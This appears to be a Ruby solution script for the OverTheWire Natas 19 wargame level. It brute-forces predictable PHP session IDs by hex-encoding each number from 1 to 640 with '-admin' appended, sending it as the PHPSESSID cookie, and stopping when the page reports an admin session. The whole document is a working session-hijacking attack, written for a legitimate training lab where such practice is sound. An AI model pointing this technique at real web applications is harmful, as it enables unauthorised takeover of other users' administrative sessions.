require 'uri'
require 'net/http'

url = URI.parse("http://natas19.natas.labs.overthewire.org/index.php")
http = Net::HTTP.new(url.host, url.port)

(1..640).each do |i|
  request = Net::HTTP::Post.new(url.request_uri)
  request.basic_auth("natas19", "<censored>")
  request["Cookie"] = "PHPSESSID=" + (i.to_s + "-admin").unpack('H*')[0] 	# transform to Hex-format
  request.set_form_data({"username" => "admin"})

  response = http.request(request)

  #puts "Trying sessionid: " + i.to_s

  if response.body.include? "You are an admin"
   print response.body
   break
  end
end
